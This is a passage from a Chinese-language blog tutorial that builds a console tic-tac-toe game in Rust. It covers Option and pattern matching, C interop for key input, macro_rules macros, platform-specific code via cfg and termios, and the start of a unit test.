class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Board</span> &#123;</span><br><span class="line">    cells: [<span class="type">Option</span>&lt;<span class="type">char</span>&gt;; <span class="number">9</span>],</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Board</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">new</span>() <span class="punctuation">-&gt;</span> Board &#123;</span><br><span class="line">        Board &#123; cells: [<span class="literal">None</span>; <span class="number">9</span>] &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// other function</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>  因为Option是被放在了prelude模块中的，prelude会放一下比较常用的东西，可以不需要导入就可以使用。这里当然也可以使用<code>Option::None</code></p></blockquote><p>那么该如何处理这些值呢？可以用前面介绍的 <code>.unwrap()</code>，来取出里面的值，但是注意！如果遇到None就会错误（因为None代表空的意义，也就是<strong>没有值</strong>，所以当然unwrap不了），然后程序崩溃。所以前面我也说过<strong>unwrap适合你几乎能确定不会报错的情况下</strong>。</p><h2 id="用模式匹配来处理异常"><a href="#用模式匹配来处理异常" class="headerlink" title="用模式匹配来处理异常"></a>用模式匹配来处理异常</h2><p>比如要实现输出board，那么就不可避免的要处理Option，那么就可以像这样</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">impl</span> <span class="title class_">Board</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">render</span>(&amp;<span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;+---+---+---+&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> <span class="variable">row</span> <span class="keyword">in</span> <span class="number">0</span>..<span class="number">3</span> &#123;</span><br><span class="line">            <span class="built_in">print!</span>(<span class="string">&quot;| &quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> <span class="variable">col</span> <span class="keyword">in</span> <span class="number">0</span>..<span class="number">3</span> &#123;</span><br><span class="line">                <span class="keyword">let</span> <span class="variable">cell</span> = <span class="keyword">self</span>.cells[row * <span class="number">3</span> + col];</span><br><span class="line">                <span class="keyword">match</span> cell &#123;</span><br><span class="line">                    <span class="title function_ invoke__">Some</span>(value) =&gt; <span class="built_in">print!</span>(<span class="string">&quot;&#123;&#125; | &quot;</span>, value),</span><br><span class="line">                    <span class="literal">None</span> =&gt; <span class="built_in">print!</span>(<span class="string">&quot;  | &quot;</span>),</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">println!</span>();</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;+---+---+---+&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>match会自动匹配到格式一样的模式，如果你是Some，就会匹配到第一种，如果是None就会匹配到第二个。要注意：<strong>match必须穷尽所有可能</strong>， 如果你想不到更多的可能，你可以匹配到 <code>_</code>， 这代表除了上面的模式以外的全部模式（必须放在最后）。</p><p>来回去看我们的前面写的读入终端内容的那一行 <code>stdin.read_line(&amp;mut input).unwrap();</code>， 我们如果不能确保是否一定没有问题，我们就可以用match来手动处理，但是这里我们介绍另一种常用的模式匹配 <code>if let</code></p><p>因为如果是正常的话我们不需要做额外的处理，所有我们只需要匹配Result::Err这一种模式就可以了<strong>（只要匹配一种或者少量的模式，那么if let就非常适合）</strong></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 因为让程序自己出现异常来panic的话，会输出很多额外的东西（给开发者看的，但是显然不是用户想看到的）</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Err</span>(e) = stdin.<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> input) &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;[Error]: &#123;&#125;&quot;</span>, e);</span><br><span class="line">    std::process::<span class="title function_ invoke__">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Move-移动-and-Move-落子"><a href="#Move-移动-and-Move-落子" class="headerlink" title="Move(移动) and Move(落子)"></a>Move(移动) and Move(落子)</h2><h3 id="简单的与C互操作"><a href="#简单的与C互操作" class="headerlink" title="简单的与C互操作"></a>简单的与C互操作</h3><p>如果只是像原来那样输入坐标的话也太难受了，这一点也不游戏！！！相信读者大爹们肯定不会买账的。所以我们来实现一下通过键盘的WASD来选择棋盘的落点（这样也不用担心输入坐标的越界问题），SPACE来确定落子。</p><p>也就是说我们需要每次按键后，程序都能及时反应。但是Rust没有直接提供一个类似于C的getch方法，当然还有第三方库可以实现按键监控，不过这里为了介绍与C互操作所以选择了调用C API。</p><p>我们需要使用extern关键字</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>我们需要一个getch用来接收按键，和一个kbhit监测是否有按键事件。在extern中定义接口</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">_getch</span>() <span class="punctuation">-&gt;</span> <span class="type">u8</span>;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">_kbhit</span>() <span class="punctuation">-&gt;</span> <span class="type">bool</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就可以封装一个按键监控的函数了，要注意ffi是不安全的，所以代码必须用unsafe包裹，（或者把函数声明为unsafe，但是这会导致每次调用都得使用unsafe）</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">getch</span>(on_block: <span class="type">bool</span>) <span class="punctuation">-&gt;</span> <span class="type">Option</span>&lt;<span class="type">u8</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">unsafe</span> &#123;</span><br><span class="line">        <span class="comment">// 设置了一个on_block来指示是否阻塞，true就会等待按下</span></span><br><span class="line">        <span class="keyword">if</span> on_block || _kbhit() &#123;</span><br><span class="line">            <span class="title function_ invoke__">Some</span>(_getch())</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="literal">None</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们把原来的main里面的逻辑迁移到Game的run方法里，为了提供一个更良好的游戏环境，你做了一个决定是清空屏幕！</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::process::Command;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Game</span> &#123;</span><br><span class="line">    <span class="comment">// other fn</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">run</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;you can use WASD to move the cursor, and press &lt;SPACE&gt; to place the symbol.&quot;</span>);</span><br><span class="line">    <span class="built_in">print!</span>(<span class="string">&quot;We will clear the screen before start.\nAre you sure to start? (Y/n): &quot;</span>);</span><br><span class="line">        std::io::<span class="title function_ invoke__">stdout</span>().<span class="title function_ invoke__">flush</span>().<span class="title function_ invoke__">unwrap</span>();<span class="comment">// 刷新缓冲区，否则会在输入后才输入print!里面的东西</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">opt</span> = <span class="title function_ invoke__">getch</span>(<span class="literal">true</span>);<span class="comment">// 等待输入</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(opt) = opt &#123;</span><br><span class="line">            <span class="keyword">if</span> !matches!(opt <span class="keyword">as</span> <span class="type">char</span>, <span class="string">&#x27;Y&#x27;</span>|<span class="string">&#x27;y&#x27;</span>|<span class="string">&#x27;\r&#x27;</span>|<span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Command::<span class="title function_ invoke__">new</span>(<span class="string">&quot;Powershell&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">args</span>(&amp;[<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;cls&quot;</span>])</span><br><span class="line">        .<span class="title function_ invoke__">status</span>()</span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;failed to clear screen&quot;</span>);</span><br><span class="line">        <span class="keyword">loop</span> &#123;</span><br><span class="line">            <span class="comment">// </span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后处理输入，给Game添加一个<code>current_pos: usize</code>记录当前位置（记得改new）</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// in loop</span></span><br><span class="line"><span class="keyword">self</span>.board.<span class="title function_ invoke__">render</span>();</span><br><span class="line"><span class="keyword">let</span> <span class="variable">opt</span> = <span class="title function_ invoke__">getch</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="keyword">match</span> opt &#123;</span><br><span class="line">    <span class="title function_ invoke__">Some</span>(opt) =&gt; <span class="keyword">match</span> opt &#123;</span><br><span class="line">        <span class="string">b&#x27;q&#x27;</span> =&gt; <span class="keyword">break</span>,</span><br><span class="line">        <span class="string">b&#x27;w&#x27;</span> =&gt; <span class="keyword">if</span> <span class="keyword">self</span>.current_pos &gt;= <span class="number">3</span> &#123; <span class="keyword">self</span>.current_pos -= <span class="number">3</span> &#125;,</span><br><span class="line">        <span class="string">b&#x27;s&#x27;</span> =&gt; <span class="keyword">if</span> <span class="keyword">self</span>.current_pos &lt; <span class="number">6</span> &#123; <span class="keyword">self</span>.current_pos += <span class="number">3</span> &#125;,</span><br><span class="line">        <span class="string">b&#x27;a&#x27;</span> =&gt; <span class="keyword">if</span> <span class="keyword">self</span>.current_pos % <span class="number">3</span> &gt; <span class="number">0</span> &#123; <span class="keyword">self</span>.current_pos -= <span class="number">1</span> &#125;,</span><br><span class="line">        <span class="string">b&#x27;d&#x27;</span> =&gt; <span class="keyword">if</span> <span class="keyword">self</span>.current_pos % <span class="number">3</span> &lt; <span class="number">2</span> &#123; <span class="keyword">self</span>.current_pos += <span class="number">1</span> &#125;,</span><br><span class="line">        <span class="string">b&#x27; &#x27;</span> =&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">self</span>.board.cells[<span class="keyword">self</span>.current_pos].<span class="title function_ invoke__">is_none</span>() &#123;</span><br><span class="line">                <span class="keyword">self</span>.board.cells[<span class="keyword">self</span>.current_pos] = </span><br><span class="line">                <span class="title function_ invoke__">Some</span>(<span class="keyword">self</span>.players[<span class="keyword">self</span>.current_player].<span class="title function_ invoke__">as_ref</span>().<span class="title function_ invoke__">unwrap</span>().symbol);</span><br><span class="line">                <span class="keyword">self</span>.current_player ^= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="literal">None</span> =&gt; &#123;&#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// is win and is full</span></span><br></pre></td></tr></table></figure><h2 id="Register-players"><a href="#Register-players" class="headerlink" title="Register players"></a>Register players</h2><p>现在好像player还是默认的，我们得实现传参自定义玩家。我们为Game实现一个register_player来注册玩家，所以在注册前玩家是空（None），我们把Game的player字段改成 <code>[Option&lt;Player&gt;; 2]</code>，并在Game::new()初始化为None。</p><p>register_player应该接收一个player数组，并且把前2个复制给Game，这里为了能链式调用选择返回本身</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">impl</span> <span class="title class_">Game</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">register_player</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>, players: &amp;[Player]) <span class="punctuation">-&gt;</span> &amp;<span class="keyword">mut</span> Game &#123;</span><br><span class="line">        <span class="keyword">self</span>.players = [</span><br><span class="line">            <span class="title function_ invoke__">Some</span>(players[<span class="number">0</span>].<span class="title function_ invoke__">clone</span>()),</span><br><span class="line">            <span class="title function_ invoke__">Some</span>(players[<span class="number">1</span>].<span class="title function_ invoke__">clone</span>())</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">self</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后你可以在像这样调用</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    Game::<span class="title function_ invoke__">new</span>()</span><br><span class="line">    .<span class="title function_ invoke__">register_player</span>(&amp;<span class="built_in">vec!</span>[</span><br><span class="line">            Player::<span class="title function_ invoke__">new</span>(name: &amp;<span class="type">str</span>, symbol: <span class="type">char</span>),</span><br><span class="line">            Player &#123; name: <span class="string">&quot;B&quot;</span>.<span class="title function_ invoke__">to_string</span>(), symbol: <span class="string">&#x27;O&#x27;</span> &#125;,</span><br><span class="line">    ]).<span class="title function_ invoke__">run</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Player</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">new</span>(name: &amp;<span class="type">str</span>, symbol: <span class="type">char</span>) <span class="punctuation">-&gt;</span> Player &#123;</span><br><span class="line">        Player &#123;</span><br><span class="line">            name: name.<span class="title function_ invoke__">to_string</span>(),</span><br><span class="line">            symbol,<span class="comment">// 变量名和成员名相同可以省略</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是比较麻烦，因为你每个都要new一下，有没有能够更加简化书写的方式呢？</p><p>当然有，你可以用宏来实现。</p><h3 id="编写一个简单的宏"><a href="#编写一个简单的宏" class="headerlink" title="编写一个简单的宏"></a>编写一个简单的宏</h3><p>Rust的宏非常强大，可以做很多事情，比如不定长参数等等，宏一般分为声明宏（也就是马上要讲的，和派生宏等），相信大家在前面已经见识到了派生宏的强大了，接下来看看如何定义一个宏。</p><p>我们定义一个register_player宏来帮我更方便的生成一个Player数组</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[macro_export]</span></span><br><span class="line"><span class="built_in">macro_rules!</span> register_player &#123;</span><br><span class="line">    ($($name:expr =&gt; $sym:expr),*) =&gt; &#123;</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// return the start two</span></span><br><span class="line">            <span class="built_in">vec!</span>[$(Player::<span class="title function_ invoke__">new</span>($name, $sym),)*][..<span class="number">2</span>].<span class="title function_ invoke__">to_vec</span>()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后你可以这么调用，要注意宏后面可以跟（）, [], {}， 虽然都可以，但是一般会有一个约定的写法，比如println!是 ()， vec!是[]</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    Game::<span class="title function_ invoke__">new</span>()</span><br><span class="line">    .<span class="title function_ invoke__">register_player</span>(</span><br><span class="line">    &amp;register_player!&#123;</span><br><span class="line">                <span class="string">&quot;Player1&quot;</span> =&gt; <span class="string">&#x27;X&#x27;</span>，</span><br><span class="line">                <span class="string">&quot;Player2&quot;</span> =&gt; <span class="string">&#x27;O&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">    ).<span class="title function_ invoke__">run</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>  宏的定义允许像match一样写多个模式，只不过宏匹配的是一段Rust源代码。</p><p>  register_player宏接受一系列的表达式，每个表达式由一个名字和一个符号组成，然后为每个表达式创建一个新的 <code>Player</code> 对象。</p><p>  宏的参数使用 <code>$(...),*</code> 的形式定义，这表示宏接受任意数量的参数，每个参数都应该匹配 <code>...</code> 中的模式，参数之间用逗号分隔。</p><p>  在宏的主体中，首先使用 <code>vec!</code> 宏创建一个 <code>Player</code> 对象的向量，每个 <code>Player</code> 对象都使用 <code>Player::new($name, $sym)</code> 创建。然后，使用 <code>[..2].to_vec()</code> 取向量的前两个元素并转换为新的向量。</p><p>  总的来说，这个宏的作用是接受一系列的名字和符号，为每个名字和符号创建一个 <code>Player</code> 对象，然后返回前两个 <code>Player</code> 对象的向量。</p></blockquote><h2 id="为不同平台分别实现"><a href="#为不同平台分别实现" class="headerlink" title="为不同平台分别实现"></a>为不同平台分别实现</h2><p>在上面我们实现了getch功能使用了C接口，而其中kbhit是在windows平台的函数（如果没有记错应该在windows.h里面），所以如果你尝试编译为其他平台的可执行文件，就会出问题，在这里问题很可能是编译时找不到kbhit这个符号。（可以自己编译看看错误）</p><p>那么如果能找到天然跨平台的实现就好了（显然使用纯rust不会有这种问题），但是这往往比较困难。所以我们可以考虑另一种方式，也就是为不同的平台分别实现相应的方法即可！</p><p>假定只要编译到windows和linux，我们来改写一下上面实现的getch</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[cfg(target_os = <span class="string">&quot;windows&quot;</span>)]</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">_getch</span>() <span class="punctuation">-&gt;</span> <span class="type">u8</span>;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">_kbhit</span>() <span class="punctuation">-&gt;</span> <span class="type">bool</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们通过cfg来设置一个（块）语句的某些属性，这里是指定这段代码只在windows平台有效，只有编译成windows平台的可执行文件才会编译这部分。</p><p>同样我们也给getch标上（这里改了个名字，因为感觉key会更合适一点）</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[cfg(target_os = <span class="string">&quot;windows&quot;</span>)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">getkey</span>(on_blocking: <span class="type">bool</span>) <span class="punctuation">-&gt;</span> <span class="type">Option</span>&lt;<span class="type">u8</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> on_blocking || <span class="keyword">unsafe</span> &#123; _kbhit() &#125; &#123;</span><br><span class="line">        <span class="keyword">unsafe</span> &#123; <span class="title function_ invoke__">Some</span>(_getch()) &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="literal">None</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来要写linux部分的实现了，linux里并没有（大概？）直接提供类似kbhit的函数，但是我们可以在读一个字节后返回。</p><p>我们得先导入libc库 <code>cargo add libc</code></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[cfg(target_os = <span class="string">&quot;linux&quot;</span>)]</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> libc;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[cfg(target_os = <span class="string">&quot;linux&quot;</span>)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">getkey</span>(on_blocking: <span class="type">bool</span>) <span class="punctuation">-&gt;</span> <span class="type">Option</span>&lt;<span class="type">u8</span>&gt; &#123;</span><br><span class="line">    <span class="comment">// 建议直接在函数内部use就可以了，毕竟如果不是linux平台也用不到</span></span><br><span class="line">    <span class="keyword">use</span> libc::&#123;termios, ECHO, ICANON, TCSANOW, VMIN, VTIME&#125;;</span><br><span class="line">    <span class="keyword">use</span> std::io::&#123;stdin, Read&#125;;</span><br><span class="line">    <span class="keyword">use</span> std::mem::zeroed;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">termios</span> = <span class="keyword">unsafe</span> &#123; zeroed::&lt;termios&gt;() &#125;;</span><br><span class="line">    <span class="keyword">unsafe</span> &#123; libc::<span class="title function_ invoke__">tcgetattr</span>(<span class="number">0</span>, &amp;<span class="keyword">mut</span> termios) &#125;;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">old</span> = termios;</span><br><span class="line">    termios.c_lflag &amp;= !(ICANON | ECHO);</span><br><span class="line">    termios.c_cc[VMIN] = <span class="keyword">if</span> on_blocking &#123; <span class="number">1</span> &#125; <span class="keyword">else</span> &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    termios.c_cc[VTIME] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsafe</span> &#123; libc::<span class="title function_ invoke__">tcsetattr</span>(<span class="number">0</span>, TCSANOW, &amp;termios) &#125;;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">buf</span> = [<span class="number">0_u8</span>; <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">res</span> = <span class="keyword">if</span> <span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read</span>(&amp;<span class="keyword">mut</span> buf).<span class="title function_ invoke__">is_ok</span>() &#123;</span><br><span class="line">        <span class="title function_ invoke__">Some</span>(buf[<span class="number">0</span>])</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="literal">None</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">unsafe</span> &#123; libc::<span class="title function_ invoke__">tcsetattr</span>(<span class="number">0</span>, TCSANOW, &amp;old) &#125;;</span><br><span class="line">    res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>  首先，这段代码使用了条件编译（<code>#[cfg(target_os = &quot;linux&quot;)]</code>），这意味着这段代码只有在目标操作系统为 Linux 时才会编译和运行。</p><p>  然后，函数 <code>getkey</code> 接受一个布尔参数 <code>on_blocking</code>，用于指定是否在等待用户输入时阻塞。</p><p>  在函数内部，首先使用 <code>libc</code> 库的 <code>termios</code> 结构体来获取和设置终端的 I&#x2F;O 属性。<code>termios</code> 结构体中的 <code>c_lflag</code> 字段用于控制输入模式，<code>ICANON</code> 和 <code>ECHO</code> 是两个标志位，分别用于控制规范模式（即行缓冲）和回显。通过将这两个标志位清零，函数设置终端为非规范模式和非回显模式，这样就可以立即读取用户的每一个键入，而不需要等待回车键。</p><p>  <code>termios</code> 结构体中的 <code>c_cc</code> 字段是一个数组，用于控制特殊字符的行为。<code>VMIN</code> 和 <code>VTIME</code> 是数组中的两个索引，分别用于控制在非规范模式下的最小读取字符数和超时时间。通过设置 <code>VMIN</code> 为 <code>on_blocking</code> 参数（如果 <code>on_blocking</code> 为 <code>true</code>，则 <code>VMIN</code> 为 1，否则为 0），函数可以在没有输入时立即返回，而不是等待用户输入。<code>VTIME</code> 被设置为 0，表示不使用超时。</p><p>  然后，函数使用 <code>stdin().read(&amp;mut buf)</code> 从标准输入读取一个字符到 <code>buf</code> 中。如果读取成功，函数返回读取到的字符，否则返回 <code>None</code>。</p><p>  最后，函数使用 <code>libc::tcsetattr(0, TCSANOW, &amp;old)</code> 恢复终端的原始 I&#x2F;O 属性。</p></blockquote><p>当然到这里其实也可以了，但是读者肯定不会买账的，因为每次调用还必须指定bool，我就不能像其他语言一样整个默认参数吗。</p><p>由于rust的函数是不支持默认参数的，但是我们可以用宏来实现类似的功能。</p><p>前面有提过宏可以像match一样匹配模式，我们这里不妨就设置2种模式，对应阻塞和非阻塞。我们简单把我们的函数包装一下。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[macro_export]</span></span><br><span class="line"><span class="built_in">macro_rules!</span> getkey &#123;</span><br><span class="line">    () =&gt; &#123;</span><br><span class="line">        <span class="title function_ invoke__">getkey</span>(<span class="literal">false</span>)</span><br><span class="line">    &#125;;</span><br><span class="line">    (block) =&gt; &#123;</span><br><span class="line">        <span class="title function_ invoke__">getkey</span>(<span class="literal">true</span>)</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样如果你使用比如 <code>getkey!()</code>， 就会不阻塞。如果使用<code>getkey!(block)</code>，就会阻塞等待用户输入了。这里面的block并不是一个变量，只是一个模式。所以你无须定义block为一个具体的东西，你当然可以写成其他的：D</p><h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><h3 id="编写简单测试"><a href="#编写简单测试" class="headerlink" title="编写简单测试"></a>编写简单测试</h3><p>有时候你想测试某个或着说一部分功能，直接编译整个项目再测试是非常低效的做法。这种情况非常建议你写test模块。</p><p>假定我们要测试我们写的register_player宏是否能按照我们想的那样运作，可以像这样写个测试函数</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[cfg(test)]</span></span><br><span class="line"><span class="keyword">mod</span> test &#123;</span><br><span 